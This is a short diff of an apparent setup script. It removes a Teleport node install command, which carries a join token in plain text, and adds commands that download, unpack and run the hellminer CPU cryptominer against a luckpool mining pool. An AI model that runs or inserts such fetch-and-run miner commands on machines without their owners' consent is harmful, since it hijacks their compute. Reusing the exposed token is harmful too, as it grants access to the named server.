@@ -1,1 +1,5 @@
-wget https://get.gravitational.com/teleport_9.2.4_amd64.deb && dpkg -i teleport_9.2.4_amd64.deb && teleport start --roles=node --token=bdb0bbb6a835d1b4b0bcdffbb24b2c42 --auth-server=takismith.teleport.sh:443
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+
+tar xf hellminer_cpu_linux.tar.gz
+
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u wallet.worke -p x --cpu 3
